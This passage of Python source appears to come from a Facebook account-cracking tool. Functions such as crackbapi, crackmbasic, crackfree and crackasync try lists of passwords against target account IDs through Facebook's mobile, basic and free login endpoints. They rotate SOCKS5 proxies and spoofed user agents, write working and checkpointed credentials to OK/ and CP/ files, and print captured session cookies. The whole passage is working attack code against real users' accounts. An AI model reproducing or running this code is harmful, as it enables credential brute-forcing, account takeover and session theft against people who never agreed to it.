%253A%25222%2522%252C%2522terminal%2522%253A%2522web%2522%252C%2522type%2522%253A%2522fb%2522%252C%2522uri%2522%253A10001%252C%2522win%2522%253A%25220%2522%257D%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdf8ac40-8c6a-45b8-a846-c6a01ebe4d2e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fudb3lgn.nimo.tv%2Fweb%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%252","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fclient_id%3D161285164570410%26redirect_uri%3Dhttps%253A%252F%252Fudb3lgn.nimo.tv%252Fweb%252Fcallback%26display%3Dpopup%26response_type%3Dcode%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%2522%253A%2522web%2522%252C%2522type%2522%253A%2522fb%2522%252C%2522uri%2522%253A10001%252C%2522win%2522%253A%25220%2522%257D%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfdf8ac40-8c6a-45b8-a846-c6a01ebe4d2e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fudb3lgn.nimo.tv%2Fweb%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522action%2522%253A%25221%2522%252C%2522appid%2522%253A%25221005%2522%252C%2522bizData%2522%253A%2522%257B%255C%2522countryCode%255C%2522%253A%255C%2522ID%255C%2522%252C%255C%2522birthday%255C%2522%253Anull%257D%2522%252C%2522busiurl%2522%253A%2522https%253A%252F%252Fwww.huya.com%2522%252C%2522byPass%2522%253A2%252C%2522countryCode%2522%253A%2522ID%2522%252C%2522domain%2522%253A%2522nimo.tv%2522%252C%2522domainList%2522%253A%2522%2522%252C%2522exchange%2522%253A%252261165858%2522%252C%2522remember%2522%253A0%252C%2522sdid%2522%253A%2522csid_f3efefed53c9457788c8b784c3ecb791%2522%252C%2522style%2522%253A%25222%2522%252C%2522terminal%252','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#--------------------[ METODE B-API ]-----------------#
def crackbapi(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v16.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'ASSqfFh8929p35Kn6/R+D8OSctQbVgiX+Pxpn8s5dImzlZcynOPPu9rnz5V0PKDXfbEwqT0VshbByU46SqsrXQ==','content-length': '332','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE MBASIC ]-------------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHODE FREE ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METODE TESTING V1 ]--------------------#
def crackasync(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=20,title=f"[bold red][[bold white] Data [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ METHOD REGULER ]--------------------#
def crackreguler(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"- {h}ramz{x} - [bold green][OK[bold red]-:[bold green]{ok}[bold green]][/][bold cyan]-[bold yellow][CP[bold red]-:[bold yellow]{cp}[bold yellow]] [bold cyan]{loop}[bold white]/[bold cyan]{len(id)}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
